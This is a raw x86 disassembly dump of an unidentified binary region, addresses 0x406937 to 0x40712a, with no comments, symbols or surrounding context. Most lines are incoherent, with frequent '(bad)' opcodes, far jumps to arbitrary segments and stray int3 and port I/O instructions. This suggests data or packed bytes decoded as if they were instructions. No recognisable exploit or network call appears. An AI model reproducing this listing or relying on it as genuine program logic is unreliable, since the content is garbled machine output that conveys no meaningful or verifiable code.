  406937:	(bad)  
  406938:	fldenv [ebp-0x7c4f01]
  40693e:	in     al,dx
  40693f:	add    BYTE PTR [edi-0x1b],cl
  406942:	jmp    FWORD PTR [ebx]
  406944:	inc    DWORD PTR [eax]
  406946:	sbb    BYTE PTR [eax],al
  406948:	test   al,0xf9
  40694a:	add    BYTE PTR [edi],ch
  40694c:	int3   
  40694d:	inc    DWORD PTR [esi]
  40694f:	call   DWORD PTR [edx-0x540041]
  406955:	mov    DWORD PTR [edx],edx
  406957:	(bad)  
  406958:	out    dx,eax
  406959:	cwde   
  40695a:	int3   
  40695b:	mov    esp,0xffe5ffff
  406960:	mov    esi,0xff12ffc3
  406965:	inc    DWORD PTR [edi-0xaf1c00]
  40696b:	sbb    edi,edi
  40696d:	add    BYTE PTR [ebp-0xb6d600],bl
  406973:	xor    eax,0xfd8300
  406978:	jne    0x40690f
  40697a:	inc    DWORD PTR [eax]
  40697c:	inc    DWORD PTR [eax]
  40697e:	dec    ebp
  40697f:	mov    DWORD PTR [edx-0x7c4c333a],ebx
  406985:	jmp    FWORD PTR [ecx+0x0]
  406988:	stos   BYTE PTR es:[edi],al
  406989:	dec    edi
  40698a:	add    dl,dl
  40698c:	inc    DWORD PTR [ebx-0x24a0ff48]
  406992:	push   DWORD PTR [edx+0xca0000]
  406998:	mov    cl,0x50
  40699a:	add    dl,ch
  40699c:	cmp    edi,0x6a
  40699f:	int3   
  4069a0:	(bad)  
  4069a1:	mov    edi,0x83cc1900
  4069a6:	xor    bh,bh
  4069a8:	cmp    ebx,DWORD PTR [edi+edi*8+0x60ffff25]
  4069af:	push   DWORD PTR [edi]
  4069b1:	ds cmp edi,0x0
  4069b5:	push   DWORD PTR [ecx+0x41c9ff]
  4069bb:	jmp    0x772c:0x2700ff
  4069c2:	mov    DWORD PTR [ebx+eax*4-0x1],ecx
  4069c6:	dec    eax
  4069c7:	add    BYTE PTR [edi+0x2f],al
  4069ca:	add    BYTE PTR [edi],dh
  4069cc:	int3   
  4069cd:	inc    DWORD PTR [eax-0xf53200]
  4069d3:	cmc    
  4069d4:	add    BYTE PTR [eax],al
  4069d6:	or     eax,0x89de0589
  4069db:	cs add bh,bh
  4069de:	or     bh,bh
  4069e0:	ss cmp edi,edi
  4069e3:	push   ecx
  4069e4:	inc    DWORD PTR [eax]
  4069e6:	(bad)  
  4069e9:	lods   eax,DWORD PTR ds:[esi]
  4069ea:	add    bl,ah
  4069ec:	add    bh,bh
  4069ee:	mov    ecx,0x6f73ff
  4069f3:	hlt    
  4069f4:	(bad)  
  4069f5:	dec    DWORD PTR [edx+0xbdaeff]
  4069fb:	push   esi
  4069fc:	add    bh,bh
  4069fe:	sar    edi,cl
  406a00:	ins    BYTE PTR es:[edi],dx
  406a01:	sbb    BYTE PTR [ebx-0xe0000c5],al
  406a07:	dec    DWORD PTR [ebx]
  406a09:	add    bh,bh
  406a0b:	icebp  
  406a0c:	(bad)  
  406a0d:	push   DWORD PTR [edx+0x0]
  406a10:	mov    eax,0xa8002f
  406a15:	push   DWORD PTR [edi]
  406a17:	jmp    DWORD PTR ds:0x45ff07
  406a1d:	jmp    FWORD PTR [ebx-0x7c88bb77]
  406a23:	push   cs
  406a24:	inc    DWORD PTR [eax]
  406a26:	xor    DWORD PTR [eax],eax
  406a28:	ret    0xffe5
  406a2b:	mov    ch,0xff
  406a2d:	int3   
  406a2e:	push   edx
  406a2f:	(bad)  
  406a30:	call   0x9d69db
  406a35:	jmp    DWORD PTR [edi+0x0]
  406a38:	aam    0x5f
  406a3a:	dec    DWORD PTR [edi]
  406a3c:	add    DWORD PTR [eax],0xffffffec
  406a3f:	cmp    DWORD PTR [eax-0x7c21ff0d],0xffffff89
  406a46:	mov    al,ds:0x89c93500
  406a4b:	pusha  
  406a4c:	inc    DWORD PTR [eax]
  406a4e:	sar    bh,cl
  406a50:	push   eax
  406a51:	inc    edx
  406a52:	add    BYTE PTR [eax+0xdccff],dh
  406a58:	call   0xafff:0xff27ffe3
  406a5f:	inc    DWORD PTR ds:0x83be004c
  406a65:	(bad)  
  406a66:	jg     0x406a67
  406a68:	sbb    ebp,DWORD PTR [ebp+0x0]
  406a6b:	(bad)  
  406a6c:	(bad)  
  406a6d:	jmp    FWORD PTR [ebp+0x0]
  406a70:	jl     0x406a41
  406a72:	(bad)  
  406a73:	add    BYTE PTR ds:[eax],al
  406a76:	add    BYTE PTR cs:[esi+0x21],al
  406a7a:	push   eax
  406a7c:	add    DWORD PTR [ebx-0x19aff15],0xffffffff
  406a83:	stos   DWORD PTR es:[edi],eax
  406a84:	add    bh,bh
  406a86:	or     eax,DWORD PTR [eax]
  406a88:	push   ss
  406a89:	xor    edi,edi
  406a8b:	xchg   BYTE PTR [eax],al
  406a8d:	(bad)  
  406a8e:	jle    0x406a13
  406a90:	idiv   BYTE PTR [edi-0x7c00b634]
  406a96:	mov    cs,WORD PTR [ecx-0x17ff4533]
  406a9c:	(bad)  
  406a9d:	jmp    FWORD PTR [edx-0x1]
  406aa0:	gs add bh,bh
  406aa3:	push   ds
  406aa4:	inc    DWORD PTR [eax]
  406aa6:	mov    edi,0xcc209b00
  406aab:	out    0xff,eax
  406aad:	xor    DWORD PTR [edi],0xffffff83
  406ab0:	cli    
  406ab1:	clc    
  406ab2:	add    BYTE PTR [eax],ch
  406ab4:	(bad)  
  406ab5:	jmp    DWORD PTR [edi+0x0]
  406ab8:	mov    ebp,0x58ffe3
  406abd:	add    BYTE PTR [ebx+eax*4],dl
  406ac0:	sub    DWORD PTR [esi-0xffe301],0x38ad0002
  406aca:	sub    edi,0xffffff83
  406acd:	or     DWORD PTR [ebx],0xffffffff
  406ad0:	std    
  406ad1:	lods   eax,DWORD PTR ds:[esi]
  406ad2:	add    BYTE PTR [edi],dl
  406ad4:	dec    esp
  406ad6:	fld    DWORD PTR [ebx-0x7c00c07e]
  406adc:	(bad)  
  406add:	inc    edi
  406adf:	mov    DWORD PTR [eax],ebx
  406ae1:	pop    edx
  406ae2:	call   edx
  406ae4:	add    BYTE PTR [ebx-0x2406ffc1],al
  406aea:	add    BYTE PTR [edx],bh
  406aec:	int3   
  406aed:	add    BYTE PTR [edi-0x7d],dh
  406af0:	inc    edx
  406af1:	mov    edi,0xffff3483
  406af6:	xor    BYTE PTR [eax],al
  406af8:	push   esp
  406af9:	rol    BYTE PTR [eax],1
  406afb:	sar    edi,cl
  406afd:	add    ch,al
  406aff:	push   edx
  406b01:	ret    
  406b02:	int3   
  406b03:	mov    ch,0xff
  406b05:	add    BYTE PTR [edi+edi*8-0x577636bc],dl
  406b0c:	add    ah,cl
  406b0e:	sub    eax,DWORD PTR [eax]
  406b10:	lahf   
  406b11:	(bad)  
  406b12:	call   esp
  406b14:	add    BYTE PTR [eax],al
  406b16:	xchg   edx,eax
  406b17:	add    BYTE PTR [eax],ch
  406b19:	mov    bl,0xff
  406b1b:	jns    0x406b1c
  406b1d:	jmp    FWORD PTR [eax+eax*1-0x75]
  406b24:	int3   
  406b25:	add    dl,dh
  406b27:	or     eax,0xe70000e2
  406b2c:	mov    esp,0xbe67dc83
  406b31:	inc    DWORD PTR [eax]
  406b33:	dec    esp
  406b35:	add    BYTE PTR [ebp-0x7c33fe9c],bl
  406b3b:	jmp    0xffb4:0xd06f83d8
  406b42:	(bad)  
  406b43:	(bad)  
  406b44:	inc    DWORD PTR [ebx-0xcfcd8a]
  406b4a:	(bad)  
  406b4b:	ds sbb edi,edi
  406b4e:	loope  0x406b5e
  406b50:	test   DWORD PTR [eax],0xff89ff83
  406b56:	imul   ebp,esi,0x4683ff8d
  406b5c:	sbb    BYTE PTR [eax],al
  406b5e:	iret   
  406b5f:	mov    cl,0xee
  406b61:	mov    DWORD PTR [eax],eax
  406b63:	inc    DWORD PTR [eax]
  406b65:	add    BYTE PTR [ebp+ecx*2-0x7e0000fa],ah
  406b6c:	icebp  
  406b6d:	int3   
  406b6e:	call   0x13fd47f
  406b73:	cmp    edi,0x0
  406b76:	push   esi
  406b77:	test   eax,0x9a0000c1
  406b7c:	clc    
  406b7d:	add    BYTE PTR [ebx-0x515d],ah
  406b83:	dec    DWORD PTR [ecx+0x318e72ff]
  406b89:	(bad)  
  406b8a:	call   DWORD PTR [eax+0x260400f3]
  406b90:	push   es
  406b91:	or     esp,0xffffffff
  406b94:	int3   
  406b95:	(bad)  
  406b96:	jmp    0x2c87:0x83ffe104
  406b9d:	add    BYTE PTR ds:0xffffa12b,cl
  406ba3:	inc    DWORD PTR [eax]
  406ba5:	dec    DWORD PTR [edx-0x335bbd]
  406bab:	es add edi,edi
  406bae:	jb     0x406bb5
  406bb0:	popf   
  406bb1:	add    BYTE PTR [eax],al
  406bb3:	(bad)  
  406bb4:	(bad)  
  406bb5:	call   FWORD PTR [eax-0xff393b]
  406bbb:	mov    ch,0x91
  406bbd:	jmp    FWORD PTR [esi]
  406bbf:	adc    bl,dh
  406bc1:	inc    DWORD PTR [eax]
  406bc3:	inc    DWORD PTR [eax]
  406bc5:	xor    DWORD PTR [esp+edx*4],0xffffffe3
  406bc9:	inc    DWORD PTR [eax]
  406bcb:	mov    ch,0x76
  406bcd:	add    ah,bl
  406bcf:	(bad)  [eax]
  406bd1:	int3   
  406bd2:	add    DWORD PTR [eax],0xffffffff
  406bd5:	(bad)  
  406bd6:	cmp    esp,DWORD PTR [ebx-0x10ff7cd6]
  406bdc:	je     0x406bde
  406bde:	shr    BYTE PTR [ecx-0x3333ffcd],1
  406be4:	inc    DWORD PTR [eax]
  406be6:	mov    ds:0xffffc645,eax
  406beb:	and    BYTE PTR [esp+ecx*8+0x3a],0xcb
  406bf0:	in     eax,dx
  406bf1:	add    DWORD PTR [eax],0xffffffff
  406bf4:	int3   
  406bf5:	(bad)  
  406bf6:	mov    edi,0x8900b4e7
  406bfb:	ja     0x406c57
  406bfd:	inc    DWORD PTR [esi]
  406bff:	jne    0x406b9d
  406c01:	(bad)  
  406c02:	(bad)  
  406c03:	(bad)  
  406c04:	(bad)  
  406c05:	jmp    eax
  406c07:	(bad)  
  406c08:	adc    DWORD PTR [ecx-0x7c0aee00],ecx
  406c0e:	sub    bl,BYTE PTR [edx-0x62]
  406c11:	(bad)  
  406c12:	inc    DWORD PTR [ebx+0x591e89ff]
  406c18:	push   ebx
  406c19:	(bad)  
  406c1a:	inc    DWORD PTR [ebx+0x53c98392]
  406c20:	test   bh,bh
  406c22:	add    bh,bh
  406c24:	inc    DWORD PTR [ebx-0xd13d09]
  406c2a:	add    BYTE PTR [eax],bh
  406c2c:	add    al,BYTE PTR [eax]
  406c2e:	push   edi
  406c2f:	popa   
  406c30:	imul   ecx,esp,0xffffffff
  406c33:	cmp    edi,0xffffffff
  406c36:	mov    ecx,0xff83a749
  406c3b:	and    BYTE PTR [edx],dh
  406c3d:	add    BYTE PTR [ebx],dl
  406c3f:	pop    ss
  406c40:	mov    al,BYTE PTR [eax]
  406c42:	add    BYTE PTR [ebx+0x6e6589ff],al
  406c48:	adc    DWORD PTR [eax],eax
  406c4a:	add    BYTE PTR [eax+edi*1-0x1],al
  406c4e:	xchg   edx,eax
  406c4f:	stc    
  406c50:	iret   
  406c51:	add    DWORD PTR [eax],0xffffffff
  406c54:	int3   
  406c55:	(bad)  
  406c56:	call   0x40fc9d
  406c5b:	mov    ebx,0x84d7ffc0
  406c60:	mov    esp,0xffff00
  406c65:	push   ebx
  406c67:	test   al,0x8f
  406c69:	add    DWORD PTR [eax],0xfffffff2
  406c6c:	and    BYTE PTR [ecx-0xbcb752],cl
  406c72:	int3   
  406c73:	add    BYTE PTR [ecx+0x251544ff],cl
  406c79:	inc    DWORD PTR [eax]
  406c7b:	je     0x406c88
  406c7d:	int3   
  406c7e:	pop    esi
  406c7f:	setne  bh
  406c82:	(bad)  
  406c83:	inc    DWORD PTR [eax]
  406c85:	jmp    DWORD PTR [ecx]
  406c87:	ret    
  406c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c89:	add    BYTE PTR [eax],al
  406c8b:	dec    esp
  406c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c8d:	add    ah,bl
  406c8f:	adc    DWORD PTR [ebx-0x330001],eax
  406c95:	jmp    DWORD PTR [ecx]
  406c97:	retf   0xff35
  406c9a:	jmp    FWORD PTR [edx-0x27]
  406c9d:	add    BYTE PTR [esi-0x51],ah
  406ca0:	mov    edi,0xcc008383
  406ca5:	add    BYTE PTR [edx+edi*4+0x2affffb9],cl
  406cac:	ror    esp,cl
  406cae:	mov    eax,ds:0xffc0e7
  406cb3:	inc    DWORD PTR [eax]
  406cb5:	dec    DWORD PTR [edx+eiz*1+0x68]
  406cbc:	add    ah,cl
  406cbe:	sbb    bh,cl
  406cc0:	pop    ebx
  406cc1:	add    BYTE PTR [eax],al
  406cc3:	dec    esp
  406cc5:	call   FWORD PTR [eax-0xffe684]
  406ccb:	dec    ebx
  406ccc:	fld    DWORD PTR [eax]
  406cce:	popf   
  406ccf:	hlt    
  406cd0:	inc    edi
  406cd1:	dec    DWORD PTR [ecx+0x1e89ffff]
  406cd7:	inc    edx
  406cd8:	xchg   BYTE PTR [eax],al
  406cda:	inc    DWORD PTR [ebx]
  406cdc:	adc    edi,edi
  406cde:	aam    0x5
  406ce0:	iret   
  406ce1:	(bad)  
  406ce2:	(bad)  
  406ce3:	inc    DWORD PTR [eax]
  406ce5:	jmp    FWORD PTR [esp+ebx*2-0x13]
  406ce9:	int3   
  406cea:	jmp    DWORD PTR [edi+ecx*1-0xdda4501]
  406cf1:	inc    DWORD PTR [eax]
  406cf3:	add    bh,bh
  406cf5:	(bad)  
  406cf6:	cmp    al,0x27
  406cf8:	int    0xcc
  406cfa:	mov    eax,esi
  406cfc:	mov    BYTE PTR [eax],0xfb
  406cff:	ins    DWORD PTR es:[edi],dx
  406d00:	sahf   
  406d01:	(bad)  
  406d02:	(bad)  
  406d03:	(bad)  
  406d04:	(bad)  
  406d05:	call   DWORD PTR [esi]
  406d07:	and    eax,0xccff8323
  406d0c:	ins    BYTE PTR es:[edi],dx
  406d0d:	add    BYTE PTR ds:0xff6c50,dl
  406d13:	add    BYTE PTR [eax],al
  406d15:	add    BYTE PTR [esi],bh
  406d17:	ins    BYTE PTR es:[edi],dx
  406d18:	cmp    eax,DWORD PTR [eax]
  406d1a:	call   edx
  406d1c:	stos   BYTE PTR es:[edi],al
  406d1d:	inc    DWORD PTR [eax-0x22]
  406d20:	sti    
  406d21:	cmp    edi,0xffffffff
  406d24:	inc    DWORD PTR [eax]
  406d26:	mov    bh,BYTE PTR [ebx-0x71]
  406d29:	add    bh,bh
  406d2b:	xrelease xchg BYTE PTR [eax],al
  406d2e:	ins    BYTE PTR es:[edi],dx
  406d2f:	cmp    al,0xdc
  406d31:	(bad)  
  406d32:	(bad)  
  406d33:	inc    DWORD PTR [eax]
  406d35:	add    BYTE PTR [eax+0x21],al
  406d38:	out    0xff,al
  406d3a:	push   esp
  406d3c:	sub    al,0xff
  406d3e:	mov    ds:0xffccd192,eax
  406d43:	inc    DWORD PTR [ebx+0x45068d00]
  406d49:	add    BYTE PTR [ebx-0x3c00c134],al
  406d4f:	sar    BYTE PTR [ecx-0xff01],1
  406d55:	cmp    DWORD PTR [esi+0x83c9fc],0xffffffc8
  406d5c:	mov    dh,0x0
  406d5e:	fisubr WORD PTR [esi-0x32]
  406d61:	mov    edi,edi
  406d63:	(bad)  
  406d64:	inc    DWORD PTR [eax]
  406d66:	scas   al,BYTE PTR es:[edi]
  406d67:	sbb    ecx,DWORD PTR [ebx]
  406d69:	add    BYTE PTR [ecx+0x2bff7dfb],cl
  406d6f:	aam    0xbb
  406d71:	add    BYTE PTR [ecx-0x5fff7c01],cl
  406d77:	inc    ebx
  406d78:	mov    BYTE PTR [eax],al
  406d7a:	or     esi,0xffffff81
  406d7d:	int3   
  406d7e:	dec    esi
  406d7f:	adc    DWORD PTR [esi-0x1],0x83ffcc
  406d86:	and    eax,0x835f6f
  406d8b:	popa   
  406d8c:	rol    DWORD PTR [eax],1
  406d8e:	or     al,0x37
  406d90:	call   0xd3a94
  406d95:	(bad)  
  406d96:	cmp    edi,eax
  406d98:	rol    BYTE PTR [eax],cl
  406d9a:	call   FWORD PTR [ecx]
  406d9c:	cmp    BYTE PTR [eax],al
  406d9e:	aaa    
  406d9f:	mov    bh,BYTE PTR [edi-0x7d]
  406da2:	add    bh,bh
  406da4:	(bad)  
  406da5:	call   edi
  406da7:	fwait
  406da8:	(bad)  
  406da9:	inc    DWORD PTR [eax]
  406dab:	mov    ah,0xcf
  406dad:	inc    DWORD PTR [ebx+esi*1-0x33ff03]
  406db4:	add    BYTE PTR [ebx-0xe200d1],al
  406dba:	add    BYTE PTR [edi],ch
  406dbc:	xchg   edi,eax
  406dbd:	add    BYTE PTR [esi+ebp*8+0x46],ch
  406dc1:	inc    DWORD PTR [eax]
  406dc3:	mov    DWORD PTR [ecx+0x5c5062cc],ecx
  406dc9:	inc    DWORD PTR [eax]
  406dcb:	jbe    0x406e2e
  406dcd:	add    BYTE PTR [edx-0xff39cb],bl
  406dd3:	add    BYTE PTR [eax],al
  406dd5:	call   DWORD PTR [eax+eax*2-0x287600da]
  406ddc:	outs   dx,BYTE PTR ds:[esi]
  406ddd:	jmp    FWORD PTR [esi]
  406ddf:	mov    al,ds:0xccff831b
  406de4:	inc    DWORD PTR [eax]
  406de6:	nop
  406de7:	add    BYTE PTR [ebx-0x7596ff01],dh
  406ded:	add    BYTE PTR [ecx+eiz*8-0xfffb],al
  406df4:	inc    DWORD PTR [eax]
  406df6:	jge    0x406e66
  406df8:	js     0x406d7d
  406dfa:	(bad)  
  406dfb:	call   0x58d0f7db
  406e00:	icebp  
  406e01:	(bad)  
  406e02:	(bad)  
  406e03:	inc    DWORD PTR [eax]
  406e05:	int3   
  406e06:	adc    DWORD PTR [ebx-0x1bffff90],eax
  406e0c:	daa    
  406e0d:	mov    DWORD PTR [ebx+0x23],esi
  406e10:	pusha  
  406e11:	add    bh,bh
  406e13:	(bad)  
  406e14:	inc    DWORD PTR [ebx+0x7e451f]
  406e1a:	add    BYTE PTR [ecx],ah
  406e1c:	call   0x5dcd7121
  406e21:	inc    DWORD PTR [eax]
  406e23:	inc    DWORD PTR [eax]
  406e25:	jmp    ecx
  406e27:	cs enter 0xff,0xd
  406e2c:	pop    ds
  406e2d:	(bad)  
  406e2e:	fidiv  DWORD PTR [esi+edi*1-0x1]
  406e32:	(bad)  
  406e33:	(bad)  
  406e34:	(bad)  
  406e35:	jmp    FWORD PTR [eax-0x8072]
  406e3b:	into   
  406e3c:	in     al,dx
  406e3d:	inc    ebx
  406e3f:	out    0x3c,al
  406e41:	inc    DWORD PTR [eax]
  406e43:	mov    edi,edi
  406e45:	add    BYTE PTR [edx],ah
  406e47:	jp     0x406de7
  406e49:	add    bh,bh
  406e4b:	push   es
  406e4c:	jae    0x406e4e
  406e4e:	and    eax,DWORD PTR [edi-0x41]
  406e51:	add    bh,bh
  406e53:	inc    DWORD PTR [eax]
  406e55:	jmp    edi
  406e57:	into   
  406e58:	sahf   
  406e59:	add    BYTE PTR [ebx+0x1283bba2],al
  406e5f:	jecxz  0x406ea8
  406e61:	add    DWORD PTR [eax],0xffffffcc
  406e64:	inc    DWORD PTR [ebx-0x76bca20f]
  406e6a:	int3   
  406e6b:	into   
  406e6c:	dec    ecx
  406e6d:	dec    edx
  406e6f:	pusha  
  406e70:	xchg   edi,eax
  406e71:	inc    DWORD PTR [eax]
  406e73:	(bad)  
  406e74:	(bad)  
  406e75:	jmp    FWORD PTR [edi+0x5]
  406e78:	and    DWORD PTR [eax],eax
  406e7a:	int3   
  406e7b:	enter  0xff38,0x45
  406e7f:	test   al,0x84
  406e81:	(bad)  
  406e82:	(bad)  
  406e83:	inc    DWORD PTR [eax]
  406e85:	add    DWORD PTR [ecx-0x66f3],0x1
  406e8c:	cmp    bh,bh
  406e8e:	xor    al,0x72
  406e90:	and    eax,0xff89ffff
  406e95:	jmp    FWORD PTR [esi]
  406e97:	push   ecx
  406e98:	push   ecx
  406e99:	(bad)  
  406e9a:	jmp    FWORD PTR [ecx+0x65b1ff1b]
  406ea0:	out    dx,eax
  406ea1:	add    bh,bh
  406ea3:	add    BYTE PTR [ebx+0x628947ff],al
  406ea9:	(bad)  
  406eaa:	(bad)  
  406eab:	in     al,dx
  406eac:	rol    DWORD PTR [eax],1
  406eae:	les    ebx,FWORD PTR [ecx+0x3f]
  406eb1:	inc    DWORD PTR [ebx+0x370000cc]
  406eb7:	das    
  406eb8:	fwait
  406eb9:	cmp    edi,0xf
  406ebc:	adc    al,0xcc
  406ebe:	in     al,dx
  406ebf:	mov    bh,0x3c
  406ec1:	add    bh,bh
  406ec3:	mov    DWORD PTR [ebx+0x1dc073ff],eax
  406ec9:	add    bh,bh
  406ecb:	sbb    ch,dh
  406ecd:	add    DWORD PTR [edx+0xfebe],0xffffffcc
  406ed4:	(bad)  
  406ed5:	dec    DWORD PTR [esp+ebp*8]
  406ed8:	dec    esi
  406ed9:	inc    DWORD PTR [eax]
  406edb:	dec    ebp
  406edc:	xchg   bh,bh
  406ede:	out    0x58,eax
  406ee0:	sub    BYTE PTR [ebx-0x76007c01],al
  406ee6:	cmp    DWORD PTR [edi],ebp
  406ee8:	cmp    BYTE PTR [eax],al
  406eea:	add    BYTE PTR [esi],dh
  406eec:	push   DWORD PTR gs:[edi-0x411d]
  406ef3:	mov    DWORD PTR [ecx-0x4527bf01],ecx
  406ef9:	mov    DWORD PTR [eax],eax
  406efb:	push   0xd621834b
  406f00:	mov    cl,0x0
  406f02:	add    bh,bh
  406f04:	int3   
  406f05:	cmp    DWORD PTR [esi-0x70c5],0x2c
  406f0c:	into   
  406f0d:	int3   
  406f0e:	dec    ecx
  406f0f:	cdq    
  406f10:	ret    0x0
  406f13:	add    bh,bh
  406f15:	mov    DWORD PTR [esi],edx
  406f17:	out    0x3f,al
  406f19:	cmp    edi,0x4d
  406f1c:	jmp    0xff:0x9b362989
  406f23:	add    DWORD PTR [eax],0x0
  406f26:	jmp    FWORD PTR [eax]
  406f28:	cmp    DWORD PTR [eax],eax
  406f2a:	add    BYTE PTR ds:0xe4d4ff33,ch
  406f30:	mov    edi,?
  406f32:	(bad)  
  406f33:	inc    DWORD PTR [eax]
  406f35:	add    bl,cl
  406f37:	push   ss
  406f38:	stos   BYTE PTR es:[edi],al
  406f39:	cmp    edi,0x57
  406f3c:	add    BYTE PTR ds:0xcc0006c8,bl
  406f43:	add    bh,bh
  406f45:	(bad)  
  406f46:	sti    
  406f47:	fnstsw WORD PTR [ebx]
  406f49:	int3   
  406f4a:	mov    DWORD PTR [ecx+0x5a290035],esi
  406f50:	mov    ecx,0xffff
  406f55:	adc    esp,0xfffffffd
  406f58:	test   BYTE PTR [eax],al
  406f5a:	inc    DWORD PTR [esi]
  406f5c:	jg     0x406ee1
  406f5e:	add    eax,0xff89244b
  406f63:	add    bh,bh
  406f65:	(bad)  
  406f66:	out    dx,al
  406f67:	jmp    0x406f84
  406f69:	add    bh,bh
  406f6b:	mov    cl,0x10
  406f6d:	call   FWORD PTR [edi]
  406f6f:	daa    
  406f70:	mov    al,ds:0xccff83
  406f75:	dec    DWORD PTR ds:0xffffd3f9
  406f7b:	dec    ecx
  406f7c:	add    DWORD PTR [ebx+0x50be9a],0xffffff
  406f86:	cmp    al,0x8f
  406f88:	xchg   esi,eax
  406f89:	(bad)  
  406f8a:	(bad)  
  406f8b:	ffree  st(4)
  406f8d:	int3   
  406f8e:	sbb    DWORD PTR [eiz*1+0xffccff],ecx
  406f95:	add    BYTE PTR [edi],ah
  406f97:	rol    DWORD PTR [esi],cl
  406f99:	(bad)  
  406f9a:	(bad)  
  406f9b:	stc    
  406f9c:	mov    esp,0x28728800
  406fa1:	inc    DWORD PTR [ebx-0x26000001]
  406fa7:	lock push ecx
  406fa9:	(bad)  
  406faa:	jmp    DWORD PTR [eax]
  406fac:	sub    eax,0x470b70ff
  406fb1:	int3   
  406fb2:	add    bh,bh
  406fb4:	add    DWORD PTR [eax],0xffffffeb
  406fb7:	jmp    0x406f9e
  406fb9:	add    ah,cl
  406fbb:	sbb    ch,BYTE PTR [ecx+ecx*4+0x18]
  406fbf:	repnz cmc 
  406fc1:	add    BYTE PTR [eax],al
  406fc3:	add    BYTE PTR [eax],al
  406fc5:	jmp    edx
  406fc7:	pop    edi
  406fc8:	cmp    bh,bh
  406fca:	(bad)  
  406fcb:	fcompp 
  406fcd:	push   DWORD PTR [eax+0xa2d4]
  406fd3:	add    bh,bh
  406fd5:	int3   
  406fd6:	retf   0xcf75
  406fd9:	add    bh,bh
  406fdb:	pop    ds
  406fdc:	dec    edi
  406fdd:	call   DWORD PTR [ebp-0xff9154]
  406fe3:	add    DWORD PTR [ebx+0x2f66e1cc],0xffffffff
  406fea:	int3   
  406feb:	sahf   
  406fec:	dec    ecx
  406fed:	int3   
  406fee:	je     0x406ff9
  406ff0:	add    al,BYTE PTR [eax]
  406ff2:	add    bh,bh
  406ff4:	dec    DWORD PTR [ecx-0x7cd803cd]
  406ffa:	jmp    DWORD PTR [ebx+0x53]
  406ffd:	add    BYTE PTR [ecx],ah
  406fff:	into   
  407000:	push   esp
  407001:	add    bh,bh
  407003:	mov    edi,edi
  407005:	add    BYTE PTR [edi-0x53],dl
  407008:	dec    esi
  407009:	inc    DWORD PTR [ebx-0x1300331d]
  40700f:	lods   eax,DWORD PTR ds:[esi]
  407010:	sahf   
  407011:	int3   
  407012:	add    bh,bh
  407014:	mov    edi,edi
  407016:	pop    ss
  407017:	xchg   DWORD PTR [edx],esp
  407019:	add    bh,bh
  40701b:	fist   WORD PTR [esi-0x1]
  40701e:	ret    0xde7e
  407021:	(bad)  
  407022:	(bad)  
  407023:	inc    DWORD PTR [eax]
  407025:	add    BYTE PTR [ebx+esi*4],dh
  407028:	jb     0x407029
  40702a:	inc    DWORD PTR [edi+0x753000a2]
  407030:	lea    eax,[eax]
  407032:	add    BYTE PTR [eax],al
  407034:	or     DWORD PTR [ecx+0x756f1d],0xffffffff
  40703b:	rcl    DWORD PTR [eax+eax*1-0x18],1
  40703f:	popa   
  407040:	jl     0x407041
  407042:	inc    DWORD PTR [ebx+0x4191cc00]
  407048:	aam    0x83
  40704a:	jmp    DWORD PTR [ebx]
  40704c:	inc    edi
  40704d:	int3   
  40704e:	inc    ebp
  40704f:	lds    eax,FWORD PTR [ebx+0x0]
  407052:	inc    DWORD PTR [eax]
  407054:	(bad)  
  407055:	(bad)  
  407056:	mov    ebp,0xbdaa
  40705b:	adc    BYTE PTR ds:0x255c4b83,0xff
  407062:	(bad)  
  407063:	(bad)  
  407064:	inc    DWORD PTR [eax]
  407066:	test   al,0xb5
  407068:	xlat   BYTE PTR ds:[ebx]
  407069:	add    bh,bh
  40706b:	and    eax,0xe8e6fff4
  407070:	mov    ah,0xff
  407072:	(bad)  
  407073:	(bad)  
  407074:	(bad)  
  407075:	jmp    DWORD PTR [ebp-0x57]
  407078:	mov    dh,0xff
  40707a:	inc    esi
  40707c:	push   ebp
  40707d:	inc    DWORD PTR [esi+0x2f]
  407080:	and    esp,ecx
  407082:	add    bh,bh
  407084:	inc    DWORD PTR [eax]
  407086:	imul   esp,DWORD PTR [eax],0xacff89ab
  40708c:	jo     0x40708d
  40708e:	push   eax
  40708f:	rcr    DWORD PTR [edi-0x1],0xff
  407093:	mov    edi,edi
  407095:	add    BYTE PTR [eax+0xff182c],ch
  40709b:	mov    edi,0x7635cccb
  4070a0:	test   edi,edi
  4070a2:	cmp    edi,0xffffffcc
  4070a5:	inc    esp
  4070a7:	cmp    BYTE PTR [edi],dl
  4070a9:	inc    DWORD PTR [eax]
  4070ab:	and    DWORD PTR [edx+0x0],edi
  4070ae:	arpl   WORD PTR [ebx-0x3300a1],bp
  4070b4:	(bad)  
  4070b5:	inc    DWORD PTR [ecx+0x83a1f4]
  4070bb:	std    
  4070bc:	cmc    
  4070bd:	add    BYTE PTR [edx+edx*8],dl
  4070c0:	push   0xffff8383
  4070c5:	mov    DWORD PTR [ebp+0x5],esp
  4070c8:	ins    BYTE PTR es:[edi],dx
  4070c9:	cmp    edi,0x62
  4070cc:	cmp    edi,0xff36bc65
  4070d2:	(bad)  
  4070d3:	inc    DWORD PTR [eax]
  4070d5:	(bad)  
  4070d6:	jns    0x40706a
  4070d8:	scas   eax,DWORD PTR es:[edi]
  4070d9:	(bad)  
  4070da:	call   FWORD PTR [eax+0x32]
  4070dd:	jmp    DWORD PTR [ecx-0x76ff8e0c]
  4070e3:	inc    DWORD PTR [eax]
  4070e5:	inc    ecx
  4070e7:	cmp    DWORD PTR [ecx],edx
  4070e9:	inc    DWORD PTR [eax]
  4070eb:	aaa    
  4070ec:	hlt    
  4070ed:	add    BYTE PTR [edx+0xc808],al
  4070f3:	(bad)  
  4070f4:	inc    DWORD PTR [eax]
  4070f6:	mov    dh,0xf2
  4070f8:	mov    cl,0xff
  4070fa:	cmp    DWORD PTR [ebx-0x6a],0xffffff83
  4070fe:	cmp    eax,ebp
  407100:	sar    edi,1
  407102:	add    BYTE PTR [eax],al
  407104:	add    BYTE PTR [eax],al
  407106:	dec    eax
  407107:	shl    BYTE PTR [esi],0xcc
  40710a:	adc    DWORD PTR [edi-0x8],0xffffffff
  40710e:	xchg   ebp,eax
  40710f:	les    edi,FWORD PTR [esi]
  407111:	add    BYTE PTR [ecx+0x5d008300],cl
  407117:	dec    esp
  407118:	repnz inc DWORD PTR [ebx+0x7f00c94b]
  40711f:	inc    ebp
  407120:	mov    BYTE PTR [eax],0xff
  407123:	add    BYTE PTR [eax],al
  407125:	add    cl,ah
  407127:	jge    0x407198
  407129:	(bad)  
  40712a:	jmp    edi
